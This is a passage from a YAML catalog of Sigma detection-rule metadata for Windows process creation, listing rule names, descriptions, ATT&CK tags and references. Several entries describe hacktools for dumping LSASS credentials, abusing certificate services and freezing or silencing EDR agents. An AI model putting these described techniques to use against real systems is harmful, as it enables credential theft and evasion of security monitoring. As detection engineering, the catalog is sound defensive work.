  - attack.impact
  - attack.t1486
  time_window: ''
  references:
  - https://www.trendmicro.com/vinfo/vn/threat-encyclopedia/malware/ransom.bat.zarlock.a
  - https://securelist.com/locked-out/68960/
  - https://github.com/redcanaryco/atomic-red-team/blob/c4097dc7ed14d7f7d08c89d148c4307097e8c294/atomics/T1486/T1486.md
  false_positives: []
  notes: ''
- detection_id: e1e0b7d7-e10b-4ee4-ac49-a4bda05d320d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gpg4win_susp_location.yml
  name: File Encryption/Decryption Via Gpg4win From Suspicious Locations
  description: Detects usage of Gpg4win to encrypt/decrypt files located in potentially
    suspicious locations.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html
  - https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e56d3073-83ff-4021-90fe-c658e0709e72
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gpresult_execution.yml
  name: Gpresult Display Group Policy Information
  description: Detects cases in which a user uses the built-in Windows utility gpresult
    to display the Resultant Set of Policy (RSoP) information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1615
  tags:
  - attack.discovery
  - attack.t1615
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult
  - https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/
  - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: d65aee4d-2292-4cea-b832-83accd6cfa43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gup_arbitrary_binary_execution.yml
  name: Arbitrary Binary Execution Using GUP Utility
  description: Detects execution of the Notepad++ updater (gup) to launch other commands
    or executables
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1535322445439180803
  false_positives:
  - Other parent binaries using GUP not currently identified
  notes: ''
- detection_id: 44143844-0631-49ab-97a0-96387d6b2d7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gup_download.yml
  name: File Download Using Notepad++ GUP Utility
  description: Detects execution of the Notepad++ updater (gup) from a process other
    than Notepad++ to download files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1535322182863179776
  false_positives:
  - Other parent processes other than notepad++ using GUP that are not currently identified
  notes: ''
- detection_id: 0a4f6091-223b-41f6-8743-f322ec84930b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gup_suspicious_execution.yml
  name: Suspicious GUP Usage
  description: Detects execution of the Notepad++ updater in a suspicious directory,
    which is often used in DLL side-loading attacks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html
  false_positives:
  - Execution of tools named GUP.exe and located in folders different than Notepad++\updater
  notes: ''
- detection_id: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml
  name: HH.EXE Execution
  description: Detects the execution of "hh.exe" to open ".chm" files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.001
  tags:
  - attack.defense-evasion
  - attack.t1218.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.001/T1218.001.md
  - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html
  - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37
  false_positives:
  - False positives are expected with legitimate ".CHM"
  notes: ''
- detection_id: f57c58b3-ee69-4ef5-9041-455bf39aaa89
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hh_chm_remote_download_or_execution.yml
  name: Remote CHM File Download/Execution Via HH.EXE
  description: Detects the usage of "hh.exe" to execute/download remotely hosted ".chm"
    files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.001
  tags:
  - attack.defense-evasion
  - attack.t1218.001
  time_window: ''
  references:
  - https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html
  - https://github.com/redcanaryco/atomic-red-team/blob/1cf4dd51f83dcb0ebe6ade902d6157ad2dbc6ac8/atomics/T1218.001/T1218.001.md
  - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37
  false_positives:
  - Unknown
  notes: ''
- detection_id: 52cad028-0ff0-4854-8f67-d25dfcbc78b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml
  name: HTML Help HH.EXE Suspicious Child Process
  description: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1059.001
  - T1059.003
  - T1059.005
  - T1059.007
  - T1218
  - T1218.001
  - T1218.010
  - T1218.011
  - T1566
  - T1566.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.initial-access
  - attack.t1047
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1059.005
  - attack.t1059.007
  - attack.t1218
  - attack.t1218.001
  - attack.t1218.010
  - attack.t1218.011
  - attack.t1566
  - attack.t1566.001
  time_window: ''
  references:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7
  - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/
  - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37
  false_positives:
  - Unknown
  notes: ''
- detection_id: e8a95b5e-c891-46e2-b33a-93937d3abc31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hh_susp_execution.yml
  name: Suspicious HH.EXE Execution
  description: Detects a suspicious execution of a Microsoft HTML Help (HH.exe)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1059.001
  - T1059.003
  - T1059.005
  - T1059.007
  - T1218
  - T1218.001
  - T1218.010
  - T1218.011
  - T1566
  - T1566.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.initial-access
  - attack.t1047
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1059.005
  - attack.t1059.007
  - attack.t1218
  - attack.t1218.001
  - attack.t1218.010
  - attack.t1218.011
  - attack.t1566
  - attack.t1566.001
  time_window: ''
  references:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7
  - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/
  - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd8c163e-a19b-402e-bdd5-419ff5859f12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_adcspwn.yml
  name: HackTool - ADCSPwn Execution
  description: Detects command line parameters used by ADCSPwn, a tool to escalate
    privileges in an active directory network by coercing authenticate from machine
    accounts and relaying to the certificate service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1557.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1557.001
  time_window: ''
  references:
  - https://github.com/bats3c/ADCSPwn
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f376c8a7-a2d0-4ddc-aa0c-16c17236d962
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_bloodhound_sharphound.yml
  name: HackTool - Bloodhound/Sharphound Execution
  description: Detects command line parameters used by Bloodhound and Sharphound hack
    tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.001
  - T1069.001
  - T1069.002
  - T1087.001
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1087.001
  - attack.t1087.002
  - attack.t1482
  - attack.t1069.001
  - attack.t1069.002
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/BloodHoundAD/BloodHound
  - https://github.com/BloodHoundAD/SharpHound
  false_positives:
  - Other programs that use these command line option and accepts an 'All' parameter
  notes: ''
- detection_id: b18c9d4c-fac9-4708-bd06-dd5bfacf200f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_c3_rundll32_pattern.yml
  name: HackTool - F-Secure C3 Load by Rundll32
  description: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12
  false_positives:
  - Unknown
  notes: ''
- detection_id: 762f2482-ff21-4970-8939-0aa317a886bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_certify.yml
  name: HackTool - Certify Execution
  description: Detects Certify a tool for Active Directory certificate abuse based
    on PE metadata characteristics and common command line arguments.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1649
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1649
  time_window: ''
  references:
  - https://github.com/GhostPack/Certify
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6938366d-8954-4ddc-baff-c830b3ba8fcd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_certipy.yml
  name: HackTool - Certipy Execution
  description: 'Detects Certipy execution, a tool for Active Directory Certificate
    Services enumeration and abuse based on PE metadata characteristics and common
    command line arguments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1649
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1649
  time_window: ''
  references:
  - https://github.com/ly4k/Certipy
  - https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 647c7b9e-d784-4fda-b9a0-45c565a7b729
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml
  name: Operator Bloopers Cobalt Strike Commands
  description: Detects use of Cobalt Strike commands accidentally entered in the CMD
    shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  - stp.1u
  time_window: ''
  references:
  - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf
  - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/
  - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f154fb6-27d1-4813-a759-78b93e0b9c48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_bloopers_modules.yml
  name: Operator Bloopers Cobalt Strike Modules
  description: Detects Cobalt Strike module/commands accidentally entered in CMD shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf
  - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/
  - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ae9c6a7c-9521-42a6-915e-5aaa8689d529
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml
  name: CobaltStrike Load by Rundll32
  description: Rundll32 can be use by Cobalt Strike with StartW function to load DLLs
    from the command line.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://www.cobaltstrike.com/help-windows-executable
  - https://redcanary.com/threat-detection-report/
  - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f35c5d71-b489-4e22-a115-f003df287317
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_process_patterns.yml
  name: Potential CobaltStrike Process Patterns
  description: Detects potential process patterns related to Cobalt Strike beacon
    activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/
  - https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e8d34729-86a4-4140-adfd-0a29c2106307
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_coercedpotato.yml
  name: HackTool - CoercedPotato Execution
  description: Detects the use of CoercedPotato, a tool for privilege escalation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://github.com/hackvens/CoercedPotato
  - https://blog.hackvens.fr/articles/CoercedPotato.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: c260b6db-48ba-4b4a-a76f-2f67644e99d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_covenant.yml
  name: HackTool - Covenant PowerShell Launcher
  description: Detects suspicious command lines used in Covenant luanchers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1564.003
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059.001
  - attack.t1564.003
  time_window: ''
  references:
  - https://posts.specterops.io/covenant-v0-5-eee0507b85ba
  false_positives: []
  notes: ''
- detection_id: 42a993dd-bb3e-48c8-b372-4d6684c4106c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_crackmapexec_execution.yml
  name: HackTool - CrackMapExec Execution
  description: This rule detect common flag combinations used by CrackMapExec in order
    to detect its use even if the binary has been replaced.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1053
  - T1059.001
  - T1059.003
  - T1110
  - T1201
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.credential-access
  - attack.discovery
  - attack.t1047
  - attack.t1053
  - attack.t1059.003
  - attack.t1059.001
  - attack.t1110
  - attack.t1201
  time_window: ''
  references:
  - https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local
  - https://www.mandiant.com/resources/telegram-malware-iranian-espionage
  - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz
  - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject
  false_positives:
  - Unknown
  notes: ''
- detection_id: 058f4380-962d-40a5-afce-50207d36d7e2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_crackmapexec_execution_patterns.yml
  name: HackTool - CrackMapExec Execution Patterns
  description: Detects various execution patterns of the CrackMapExec pentesting framework
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1053
  - T1059.001
  - T1059.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1047
  - attack.t1053
  - attack.t1059.003
  - attack.t1059.001
  - attack.s0106
  time_window: ''
  references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  false_positives:
  - Unknown
  notes: ''
- detection_id: f26307d8-14cd-47e3-a26b-4b4769f24af6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_crackmapexec_patterns.yml
  name: HackTool - CrackMapExec Process Patterns
  description: Detects suspicious process patterns found in logs when CrackMapExec
    is used
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6f8b3439-a203-45dc-a88b-abf57ea15ccf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_crackmapexec_powershell_obfuscation.yml
  name: HackTool - CrackMapExec PowerShell Obfuscation
  description: The CrachMapExec pentesting framework implements a PowerShell obfuscation
    with some static strings detected by this rule.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.005
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027.005
  time_window: ''
  references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/helpers/powershell.py#L242
  false_positives:
  - Unknown
  notes: ''
- detection_id: 36d88494-1d43-4dc0-b3fa-35c8fea0ca9d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_createminidump.yml
  name: HackTool - CreateMiniDump Execution
  description: Detects the use of CreateMiniDump hack tool used to dump the LSASS
    process memory for credential extraction on the attacker's machine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
  false_positives:
  - Unknown
  notes: ''
- detection_id: d78b5d61-187d-44b6-bf02-93486a80de5a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_dinjector.yml
  name: HackTool - DInjector PowerShell Cradle Execution
  description: Detects the use of the Dinject PowerShell cradle based on the specific
    flags
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - https://web.archive.org/web/20211001064856/https://github.com/snovvcrash/DInjector
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d474c8fe-bb69-4ea0-b7d9-f682b56d52d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_doppelganger.yml
  name: HackTool - Doppelanger LSASS Dumper Execution
  description: Detects the execution of the Doppelanger hacktool which is used to
    dump LSASS memory via process cloning while evading common detection methods
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://labs.yarix.com/2025/06/doppelganger-an-advanced-lsass-dumper-with-process-cloning/
  - https://github.com/vari-sh/RedTeamGrimoire/tree/668e0357072546065729ad623f8c02f7be21bb08/Doppelganger
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2704ab9e-afe2-4854-a3b1-0c0706d03578
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_dumpert.yml
  name: HackTool - Dumpert Process Dumper Execution
  description: Detects the use of Dumpert process dumper, which dumps the lsass.exe
    process memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/outflanknl/Dumpert
  - https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/
  false_positives:
  - Very unlikely
  notes: ''
- detection_id: c598cc0c-9e70-4852-b9eb-8921af79f598
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_edr_freeze.yml
  name: Hacktool - EDR-Freeze Execution
  description: 'Detects execution of EDR-Freeze, a tool that exploits the MiniDumpWriteDump
    function and WerFaultSecure.exe to suspend EDR and Antivirus processes on Windows.

    EDR-Freeze leverages a race-condition attack to put security processes into a
    dormant state by suspending WerFaultSecure at the moment it freezes the target
    process.

    This technique does not require kernel-level exploits or BYOVD, but instead abuses
    user-mode functionality to temporarily disable monitoring by EDR or Antimalware
    solutions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.zerosalarium.com/2025/09/EDR-Freeze-Puts-EDRs-Antivirus-Into-Coma.html
  - https://github.com/TwoSevenOneT/EDR-Freeze
  false_positives:
  - Unlikely
  notes: ''
- detection_id: eb2d07d4-49cb-4523-801a-da002df36602
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_edrsilencer.yml
  name: HackTool - EDRSilencer Execution
  description: 'Detects the execution of EDRSilencer, a tool that leverages Windows
    Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents
    from reporting security events to the server based on PE metadata information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://github.com/netero1010/EDRSilencer
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 79f4ede3-402e-41c8-bc3e-ebbf5f162581
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_empire_powershell_launch.yml
  name: HackTool - Empire PowerShell Launch Parameters
  description: Detects suspicious powershell command line parameters used in Empire
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
